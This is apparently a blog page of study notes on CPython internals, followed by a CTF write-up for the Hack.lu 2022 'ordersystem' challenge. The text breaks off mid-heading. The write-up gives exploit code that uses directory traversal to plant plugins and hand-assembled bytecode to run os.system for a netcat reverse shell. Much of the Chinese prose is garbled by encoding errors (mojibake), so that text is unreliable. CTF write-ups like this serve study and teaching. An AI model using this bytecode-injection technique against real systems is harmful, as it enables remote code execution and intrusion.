bytestring or <code>inspect.getmembers([func/module/class])</code> to see all members.</li></ul></li></ul><ul><li><p>python built-in function: <code>eval</code> &amp; <code>exec</code>. <a href="https://stackoverflow.com/questions/2220699/whats-the-difference-between-eval-exec-and-compile">difference</a>: <code>eval</code> accepts only a <strong>single expression</strong>, <code>exec</code> can take a code block</p></li><li><p><strong>METHOD</strong> </p><ul><li>pythonçš„methodæ˜¯æŒ‡åœ¨classé‡Œçš„, è€Œfunctionå°±æ˜¯å­—é¢æ„æ€. </li><li><em>bound methods</em>: a function is an attribute of class and it is accessed via the instances(common case)</li><li><em>unbound methods</em>: Methods that do not have an instance of the class as the first argument. As of Python 3.0, the unbound methods <strong>have been removed from the language</strong>. They are not bounded with any specific object of the class. To make the method work it should be made into a <strong>static method</strong>. </li></ul></li><li><p>use decorator<code>@staticmethod</code> or <code>staticmethod()</code>.</p></li><li><p><strong>PyObject</strong>:</p><ul><li>All Python objects ultimately <strong>share a small number of fields</strong> at the beginning of the objectâ€™s representation in memory. è¿™äº›å­—æ®µå°±æ˜¯æŒ‡çš„<strong>PyObject</strong>, æ‰€æœ‰object typeéƒ½æ˜¯è¯¥ç±»å‹çš„æ‰©å±•, è€Œä¸”å¯¹å¤–<strong>åªä½¿ç”¨<code>PyObject*</code>è¿™ç§ç±»å‹</strong>. </li><li><strong>PyVarObject</strong> is an extension of <a href="https://docs.python.org/3/c-api/structures.html#c.PyObject"><code>PyObject</code></a> that adds the <code>ob_size</code> field. This is only used for objects that have some notion of <em>length</em>. æ¯”å¦‚è¯´<code>PyTupleObject</code>çš„å¤´éƒ¨å°±æ˜¯ä¸€ä¸ª<code>PyVarObject ob_base</code>. </li><li><code>co_names</code>æ˜¯PyTupleç±»å‹çš„, ä½¿ç”¨<code>names = PyTuple_New(n);</code>è¿›è¡Œåˆå§‹åŒ–. </li></ul></li><li><p><a href="https://docs.python.org/3.11/reference/datamodel.html#objects-values-and-types">Data model</a> </p><ul><li><strong><u>Module</u></strong>: A module object has a <strong>namespace</strong> implemented by a <strong>dictionary</strong> object (this is the dictionary referenced by the <code>__globals__</code> attribute of functions defined in the module). Attribute references are translated to lookups in this dictionary, e.g., <code>m.x</code> is equivalent to <code>m.__dict__[&quot;x&quot;]</code>. A module object does not contain the code object used to initialize the module (since it isnâ€™t needed once the initialization is done).</li><li><u><strong>Function</strong></u>: ä¸æ˜¯å¾ˆé‡è¦. </li><li><strong><u><em>Objects</em></u></strong> are Pythonâ€™s abstraction for data. Every object has an identity, a type and a value. An objectâ€™s type determines the operations that the object supports (e.g., â€œdoes it have a length?â€) and also defines the possible values for objects of that type.</li></ul></li></ul><hr><blockquote><p>é™¤äº†python innards, <a href="https://realpython.com/cpython-source-code-guide">è¿™ä¸€ç¯‡</a>ä¸‰å¹´å‰å†™çš„æ¯”è¾ƒæ–°ä¸€ç‚¹. è¿˜æœ‰ä¸€äº›å›¾è§£, çœŸä¸é”™. </p></blockquote><h4 id="Intro-amp-AST"><a href="#Intro-amp-AST" class="headerlink" title="Intro &amp; AST"></a>Intro &amp; AST</h4><ul><li><p>src structure(in Linux platform)</p><ul><li>Include â€” header files</li><li>Objects â€” object implementations, from int to type</li><li>Python â€” interpreter, bytecode compiler and other essential infrastructure</li><li>Parser â€” parser, lexer and parser generator</li><li>Modules â€” stdlib extension modules, and main.c </li><li>Programs â€” not much, but has the real main() function</li></ul><blockquote><p>when it comes to modern windows, lookup <code>PCBuild â€” Tools to build Python for modern Windows using Visual Studio</code> </p></blockquote></li><li><p>ä¸€æ—¶ä¸çŸ¥é“è¦çœ‹å“ªä¸ªâ€¦å…ˆçœ‹çœ‹æœ€æ–°çš„è¿™ä¸ªå§. </p></li><li><p>Grammar is written in BNF. <a href="https://en.m.wikipedia.org/wiki/Backus%E2%80%93Naur_form">https://en.m.wikipedia.org/wiki/Backus%E2%80%93Naur_form</a> </p></li><li><p>è§£é‡Šå™¨å·¥ä½œæµç¨‹:</p></li></ul><img src="../../image/recent_ctf/swim-lanes-chart-1.9fb3000aad85.png" alt="Python run swim lane diagram" style="zoom: 67%;" /><ul><li>ASTç›´æ¥è·³è¿‡äº†, çœ‹çœ‹object typeä¹‹ç±»çš„å®šä¹‰. å°±æ¯”å¦‚stackå…¶å®æ˜¯<code>PyObject *</code>ç±»å‹çš„ä¸€æ ·. </li><li>The <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/compile.c#L312"><code>PyAST_CompileObject()</code></a> function is the main entry point to the CPython compiler. </li><li>But before the compiler starts, a global compiler state is created</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compiler</span> &#123;</span><br>    PyObject *c_filename;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">symtable</span> *<span class="hljs-title">c_st</span>;</span><br>    PyFutureFeatures *c_future; <span class="hljs-comment">/* pointer to module&#x27;s __future__ */</span><br>    PyCompilerFlags *c_flags;<br><br>    <span class="hljs-keyword">int</span> c_optimize;              <span class="hljs-comment">/* optimization level */</span><br>    <span class="hljs-keyword">int</span> c_interactive;           <span class="hljs-comment">/* true if in interactive mode */</span><br>    <span class="hljs-keyword">int</span> c_nestlevel;<br>    <span class="hljs-keyword">int</span> c_do_not_emit_bytecode;  <span class="hljs-comment">/* The compiler won&#x27;t emit any bytecode</span><br><span class="hljs-comment">                                    if this value is different from zero.</span><br><span class="hljs-comment">                                    This can be used to temporarily visit</span><br><span class="hljs-comment">                                    nodes without emitting bytecode to</span><br><span class="hljs-comment">                                    check only errors. */</span><br><br>    PyObject *c_const_cache;     <span class="hljs-comment">/* Python dict holding all constants,</span><br><span class="hljs-comment">                                    including names tuple */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">compiler_unit</span> *<span class="hljs-title">u</span>;</span> <span class="hljs-comment">/* compiler state for current block */</span><br>    PyObject *c_stack;           <span class="hljs-comment">/* Python list holding compiler_unit ptrs */</span> <span class="hljs-comment">//notice this line!!!!!!!!!!!!!!!!!</span><br>    PyArena *c_arena;            <span class="hljs-comment">/* pointer to memory allocation arena */</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>then PyAST_CompileObject does the following things:<ul><li>some flag initializations â€¦ </li><li>Build a <strong>symbol table</strong> from the module object.</li><li><strong>Run the compiler</strong> with the compiler state and <strong>return the code object</strong>.</li><li>Free any allocated memory by the compiler.</li></ul></li></ul><h4 id="symbol-table"><a href="#symbol-table" class="headerlink" title="symbol table"></a>symbol table</h4><ul><li>In <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/compile.c#L312"><code>PyAST_CompileObject()</code></a> there was a reference to a <code>symtable</code> and a call to <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/symtable.c#L262"><code>PySymtable_BuildObject()</code></a> with the module to be executed. The purpose of the symbol table is to provide a list of namespaces, globals, and locals for the compiler to use for referencing and resolving scopes. </li><li>â€¦</li></ul><h4 id="Core-Compilation-Process"><a href="#Core-Compilation-Process" class="headerlink" title="Core Compilation Process"></a>Core Compilation Process</h4><ul><li>Now that the <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/compile.c#L312"><code>PyAST_CompileObject()</code></a> has a compiler state, a symtable, and a module in the form of the AST, the actual compilation can begin.</li><li>in cpython 3.11 branch, the PyCodeObject is in <code>Include\cpython\code.h</code> and is a macro. </li><li>æ”¾å¼ƒäº†, æš‚æ—¶æ²¡å¸®åŠ©çš„ç¼–è¯‘ç»†èŠ‚. </li></ul><h4 id="Assembly"><a href="#Assembly" class="headerlink" title="Assembly"></a>Assembly</h4><p>å¦‚å, æ²¡å•¥ç‰¹åˆ«çš„.</p><h4 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a><a href="https://realpython.com/cpython-source-code-guide/#conclusion_2">Conclusion</a></h4><p>ç¼–è¯‘å¤§è‡´è¿‡ç¨‹, çŸ¥é“è¿™ä¸ªå°±è¡Œäº†</p><h4 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a><a href="https://realpython.com/cpython-source-code-guide/#execution">Execution</a></h4><ul><li>This stage forms the execution component of CPython. Each of the bytecode operations is taken and executed using a â€œStack Frameâ€ based system.</li><li>Before a frame can be executed, it needs to be referenced from a thread. CPython can have many threads running at any one time within a single interpreter. An Interpreter state <strong>includes a list of those threads as a linked list</strong>. The thread structure is called <strong><a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Include/pystate.h#L23"><code>PyThreadState</code></a></strong>, and there are many references throughout <code>ceval.c</code>.</li></ul><h4 id="Frame-Execution"><a href="#Frame-Execution" class="headerlink" title="Frame Execution"></a>Frame Execution</h4><ul><li>Frames are executed in the main execution loop inside <a href="https://github.com/python/cpython/blob/d93605de7232da5e6a182fd1d5c220639e900159/Python/ceval.c#L745"><code>_PyEval_EvalFrameDefault()</code></a>. This function is central function that brings everything together and brings your code to life. It contains decades of optimization since even a single line of code can have a significant impact on performance for the whole of CPython.</li></ul><h4 id="The-Value-Stack"><a href="#The-Value-Stack" class="headerlink" title="The Value Stack"></a><a href="https://realpython.com/cpython-source-code-guide/#the-value-stack">The Value Stack</a></h4><p>æˆ‘æƒ³çœ‹åˆ°çš„ä¸œè¥¿. </p><ul><li><code>PyObject **stack_pointer</code>æŒ‡å‘æ ˆé¡¶çš„ä¸Šä¸€ä¸ªä½ç½®. </li><li>switch in ceval.c:<ul><li>any operation that fails must <code>goto error</code>, all operation that succeed call <code>DISPATCH()</code> </li><li><code>DISPATCH()</code>:  if tracing is enabled, do the trace, if tracing is not enabled, a <code>goto</code> is called to <code>dispatch_opcode</code>, which jumps back to the top of the loop for the next instruction.</li><li><code>PREDICT()</code> macro will do the same as it says. When the prediction succeeds, it means execution flow havenâ€™t to go through the loop again. </li></ul></li><li>Some of the operations, such as <code>CALL_FUNCTION</code>, <code>CALL_METHOD</code>, have an operation argument referencing another compiled function. In these cases, <strong>another frame is pushed to the frame stack in the thread</strong>, and the evaluation loop is run for that function until the function completes. <strong>Each time a new frame is created and pushed onto the stack, the value of the frameâ€™s <code>f_back</code> is set to the current frame before the new one is created</strong>. </li></ul><h3 id="ordersystem-wp1-wp2"><a href="#ordersystem-wp1-wp2" class="headerlink" title="ordersystem wp1 wp2:"></a>ordersystem <a href="https://enoflag.github.io/writeups/hacklu2022/ordersystem/">wp1</a> <a href="https://qwerty-po.notion.site/Hack-lu-2022-Writeup-03ddbe17de6c47629d755998a5d6e411">wp2</a>:</h3><h4 id="src"><a href="#src" class="headerlink" title="src"></a>src</h4><ul><li>ç”¨å­—å…¸ç±»å‹<code>ENTRIES</code>æ¥ä¿å­˜è¾“å…¥çš„ä¿¡æ¯. å…¶ä¸­keyæœ€å¤š12å­—èŠ‚, å¯ä»¥æ˜¯ä»»æ„bytes, ä½†æ˜¯dataåªèƒ½æ˜¯printable hex number, é•¿åº¦ä¸º0-255.</li><li>å¯ä¿å­˜dataåˆ°storageæ–‡ä»¶å¤¹ä¸­çš„key.decodeæˆ–è€…key.hex(ä½œä¸ºæ–‡ä»¶åç§°), <strong>è¿˜å¯ä»¥</strong>directory traversalåˆ°pluginsæ–‡ä»¶å¤¹ä¸­. </li><li>æ‰§è¡Œpluginsæ—¶è¯»å–ç›¸åº”bytecodeæ–‡ä»¶, å°†æ‰€æœ‰keyåŠ ä¸Š<code>plugin_log(msg,filename=&#39;./log&#39;,raw=False)</code>æ”¾åˆ°codeTypeçš„constsä¸­, <strong>å°†bytecodeåé¢ä½¿ç”¨åˆ†å·éš”å¼€çš„bytesæ”¾åˆ°namesä¸­</strong>.<br>å…¶ä¸­logå‡½æ•°å¯åšåˆ°å°†ç¬¬ä¸€ä¸ªå‚æ•°çš„å†…å®¹(æ— é™åˆ¶)å†™å…¥<code>./log</code>æ–‡ä»¶. æœ€å<code>exec()</code>æ‰§è¡Œä»£ç . <strong>ä½†æ˜¯</strong>, æ³¨æ„è°ƒç”¨logå‡½æ•°æ—¶ç¬¬ä¸€ä¸ªå‚æ•°msgåªèƒ½æ˜¯æ¥è‡ªco_const, è€Œconstsåˆæ˜¯ä»keyä¸­è·å–. </li></ul><p>dockerå®‰è£…çš„pythonç‰ˆæœ¬æ˜¯3.10.6</p><h4 id="problem"><a href="#problem" class="headerlink" title="problem"></a>problem</h4><ul><li><p>because of the hexdump executed by server, we can only send printable hex numbers, which dramatically lessens our options.<br>notice that the code in block is actually a condition statementâ€¦â€¦â€¦.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">1</span>]: <span class="hljs-keyword">import</span> dis<br>   ...: &#123;<br>   ...:     <span class="hljs-built_in">hex</span>(op_code): op_name<br>   ...:     <span class="hljs-keyword">for</span> op_name, op_code <span class="hljs-keyword">in</span> dis.opmap.items()<br>   ...:     <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(op_code) <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>   ...: &#125;<br>Out[<span class="hljs-number">1</span>]:<br>&#123;<span class="hljs-string">&#x27;0x31&#x27;</span>: <span class="hljs-string">&#x27;WITH_EXCEPT_START&#x27;</span>,<br> <span class="hljs-string">&#x27;0x32&#x27;</span>: <span class="hljs-string">&#x27;GET_AITER&#x27;</span>,<br> <span class="hljs-string">&#x27;0x33&#x27;</span>: <span class="hljs-string">&#x27;GET_ANEXT&#x27;</span>,<br> <span class="hljs-string">&#x27;0x34&#x27;</span>: <span class="hljs-string">&#x27;BEFORE_ASYNC_WITH&#x27;</span>,<br> <span class="hljs-string">&#x27;0x36&#x27;</span>: <span class="hljs-string">&#x27;END_ASYNC_FOR&#x27;</span>,<br> <span class="hljs-string">&#x27;0x37&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_ADD&#x27;</span>,<br> <span class="hljs-string">&#x27;0x38&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_SUBTRACT&#x27;</span>,<br> <span class="hljs-string">&#x27;0x39&#x27;</span>: <span class="hljs-string">&#x27;INPLACE_MULTIPLY&#x27;</span>,<br> <span class="hljs-string">&#x27;0x61&#x27;</span>: <span class="hljs-string">&#x27;STORE_GLOBAL&#x27;</span>,<br> <span class="hljs-string">&#x27;0x62&#x27;</span>: <span class="hljs-string">&#x27;DELETE_GLOBAL&#x27;</span>,<br> <span class="hljs-string">&#x27;0x63&#x27;</span>: <span class="hljs-string">&#x27;ROT_N&#x27;</span>,<br> <span class="hljs-string">&#x27;0x64&#x27;</span>: <span class="hljs-string">&#x27;LOAD_CONST&#x27;</span>,<br> <span class="hljs-string">&#x27;0x65&#x27;</span>: <span class="hljs-string">&#x27;LOAD_NAME&#x27;</span>,<br> <span class="hljs-string">&#x27;0x66&#x27;</span>: <span class="hljs-string">&#x27;BUILD_TUPLE&#x27;</span>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>but the <code>WITH_EXCEPT_START</code> is something special. </p><blockquote><p><code>WITH_EXCEPT_START</code>: Calls the function in position 7 on the stack with the top three items on the stack as arguments. Used to implement the call <code>context_manager.__exit__(*exc_info())</code> when an exception has occurred in a <a href="https://docs.python.org/3.10/reference/compound_stmts.html#with">with</a> statement.</p></blockquote><ul><li><a href="https://docs.python.org/3.10/reference/compound_stmts.html#with">with statement</a>(æœ‰æ›´å¤šä¸œè¥¿) | <a href="https://docs.python.org/3.10/library/stdtypes.html#typecontextmanager">context manager</a> </li><li>é€šè¿‡withè¯­å¥çš„æµç¨‹çœ‹å‡ºæ¥è²Œä¼¼åœ¨with_statement evaluateä¹‹åçš„å€¼è‡ªå¸¦manager, æ¯”å¦‚open()è¿”å›çš„file objectä¸­å°±æœ‰<code>__enter__</code>å‡½æ•°, è€Œä¸”enterä¹Ÿä¸éœ€è¦åšä»€ä¹ˆå°±ç›´æ¥è¿”å›file object. è€Œ<code>__exit__</code>å°±æ˜¯ç›´æ¥è°ƒç”¨close()</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* At the top of the stack are 7 values:</span><br><span class="hljs-comment">   - (TOP, SECOND, THIRD) = exc_info()</span><br><span class="hljs-comment">   - (FOURTH, FIFTH, SIXTH) = previous exception for EXCEPT_HANDLER</span><br><span class="hljs-comment">   - SEVENTH: the context.__exit__ bound method</span><br><span class="hljs-comment">   We call SEVENTH(TOP, SECOND, THIRD).</span><br><span class="hljs-comment">   Then we push again the TOP exception and the __exit__</span><br><span class="hljs-comment">   return value.</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure></li></ul><p>ä¸‹é¢è¿™ä¸ªæµç¨‹ä¹Ÿæ˜¯ä¸æ–­çš„ä¿®æ”¹ä¹‹åæ‰æˆåŠŸçš„â€¦â€¦</p><ol><li>Calculate proof of work to get the real target port, ä½¿ç”¨dockerå®Œå…¨è§ä¸åˆ°. </li><li>Craft python bytecode which will spawn a reverse shell to the attackerâ€™s machine as <code>exp_bc</code>  </li><li>Divide <code>exp_bc</code> into chunks of 12 bytes</li><li>Upload the filling consts to 0x30 items. </li><li>Upload num_chunk plugins and <code>dump()</code> </li><li>Store <code>exp_bc</code> as keys in the storage</li><li>Run one plugin for each chunk which appends the key to the logfile aka exploit plugin</li><li>Upload nc command string. </li><li>Run the exploit plugin</li></ol><h4 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof of work"></a>proof of work</h4><p>?</p><h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-number">55</span><br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>]<br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler ?????what is nop?? ä¸å°±æ˜¯å‹å…¥äº†ä¸€ä¸ªlongç±»å‹çš„0å—, è¿™ä¸ªæŒ‡ä»¤ä¸éœ€è¦å‚æ•°.</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),<span class="hljs-comment">#loadäº†ä¸€ä¸ªstring object, æ‰€ä»¥å¯ä»¥åœ¨ä»–ä¹‹ä¸Šè°ƒç”¨decodeå‡½æ•°.</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>)<br>]<br></code></pre></div></td></tr></table></figure><p>Then, we can â€œassembleâ€ the code:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exp_bc = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> op, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exp_bc += <span class="hljs-built_in">bytes</span>([dis.opmap[op], arg])<br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> co_names:<br>    exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span> + name.encode()<br>exp_bc += <span class="hljs-string">b&#x27;;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥æŒ‡ä»¤éå¸¸çš„ç®€å•, å°±æ˜¯ä¸€ä¸ªå­—èŠ‚æŒ‡ä»¤åŠ ä¸Šä¸€ä¸ªå­—èŠ‚æ“ä½œæ•°. </p><ul><li>ä¸ºä»€ä¹ˆæ˜¯åˆ†å·? <strong>æ˜¯é¢˜ç›®æºç ä¸­è¯†åˆ«åˆ°æœ‰åˆ†å·æ—¶è‡ªåŠ¨æŠŠnamesåŠ å…¥åˆ°CodeObject.names</strong> </li><li>è¿˜è¦æ³¨æ„åˆ°nc_index, è¿™æ˜¯åœ¨uploadæ‰€æœ‰çš„keyä¹‹åæ‰ç¡®å®šä¸‹æ¥çš„åç§», å› ä¸ºlimit_codeçš„æ“ä½œæ•°å¿…é¡»æ˜¯åœ¨printable hexçš„èŒƒå›´ä¹‹å†…, æ‰€ä»¥å¹²è„†æŠŠncå‘½ä»¤çš„è¿™ä¸€ä¸ªå­—ç¬¦ä¸²å’Œlimit_codeçš„å‚æ•°æ”¾åˆ°<code>consts[0x30:0x40]</code>çš„éƒ¨åˆ†. </li><li>è¿™é‡Œæœ‰ä¸ªå‘(è‡ªå·±ä½œçš„)å°±æ˜¯åœ¨ç¬¬äºŒä¸ªforä¹‹å‰ä¹Ÿåœ¨bcåé¢åŠ ä¸Šäº†åˆ†å·, å¯¼è‡´co_namesçš„ç¬¬ä¸€ä¸ªå°±æ˜¯ç©ºå­—èŠ‚ä¸², æ‰€æœ‰çš„idxéƒ½ä¸å¯¹äº†, çœ‹åˆ°äº†ä»€ä¹ˆ<code>No module named &#39;print&#39;</code>è¿™ç§ç¥å¥‡æŠ¥é”™. </li><li>æ¯”è¾ƒç–‘æƒ‘çš„æ˜¯printåªæ˜¯ä¸ªå­—ç¬¦ä¸², ä¸ºä»€ä¹ˆä¼šè¢«CALL_FUNCTIONå½“åšæ˜¯callable? åŸæ¥load_nameä¸ä»…æ˜¯ä»namesä¸­å–å‡ºäº†åç§°å­—ç¬¦ä¸², è€Œä¸”åœ¨localå’Œglobalä¸¤ä¸ªscopeä¸­æŸ¥æ‰¾åˆ°äº†å¯¹åº”çš„item, è¿™é‡Œçš„printå¯¹åº”çš„æ˜¯ä¸€ä¸ªcallable item, è‡ªç„¶æ˜¯å¯ä»¥è¢«CALL_FUNCTIONè°ƒç”¨çš„. !!</li></ul><h4 id="å¡«å……constså‰48ä¸ªä½ç½®"><a href="#å¡«å……constså‰48ä¸ªä½ç½®" class="headerlink" title="å¡«å……constså‰48ä¸ªä½ç½®"></a>å¡«å……constså‰48ä¸ªä½ç½®</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#fill slots</span><br>chunk_size = <span class="hljs-number">12</span><br>num_chunks = <span class="hljs-built_in">len</span>(exp_bc) // chunk_size + <span class="hljs-number">1</span><br><span class="hljs-comment"># num_chunk is 6, limit_code is 6, total is 12, and plugin_log will be 13</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span> - num_chunks):<br>    upload_key(<span class="hljs-string">b&#x27;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&#123;%d&#x27;</span> % (i+<span class="hljs-number">10</span>))<br></code></pre></div></td></tr></table></figure><p>48=0x30, ä¸ºäº†æŠŠæ•°æ®æ”¾åœ¨<code>\x30</code>ä¸­, å…ˆæŠŠå‰é¢çš„éƒ¨åˆ†å¡«æ»¡, æœ€åå‰©ä¸‹6ä¸ªä½ç½®æ”¾å…¥</p><h4 id="Upload-limit-code"><a href="#Upload-limit-code" class="headerlink" title="Upload limit_code"></a>Upload limit_code</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#upload limit_code as serveral plugins in data</span><br>func_idx = <span class="hljs-number">48</span>+<span class="hljs-number">6</span>+<span class="hljs-number">1</span><br>msg_idx = <span class="hljs-number">0x30</span><br>fn_idx = <span class="hljs-number">0x30</span>+<span class="hljs-number">6</span><br>raw_idx = <span class="hljs-number">0x30</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_chunks):<br>    bc = get_plugin_code(i+msg_idx, func_idx, fn_idx, raw_idx)<br>    store(<span class="hljs-string">b&#x27;../plugins/%d&#x27;</span> % i, bc)<br>dump()<br></code></pre></div></td></tr></table></figure><p>è¿™äº›idxéƒ½æ˜¯äº‹åå¡«ä¸Šçš„. å…¶ä¸­rawæ˜¯éšä¾¿ä¸€ä¸ªä¸ä¸ºç©ºçš„å˜é‡, func_idxæ˜¯æœ€åä¸€ä¸ªconsts.</p><p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯func_idxå·²ç»æ˜¯55, åé¢çš„commandçš„ä¸‰ä¸ªä½ç½®å·²ç»æ”¾ä¸ä¸‹, æ‰€ä»¥æ‰§è¡Œå®Œå…­ä¸ªpluginsåæ‰èƒ½ä¸Šä¼ å‘½ä»¤. </p><h4 id="Upload-exploit-bytecode-in-chunks"><a href="#Upload-exploit-bytecode-in-chunks" class="headerlink" title="Upload exploit bytecode in 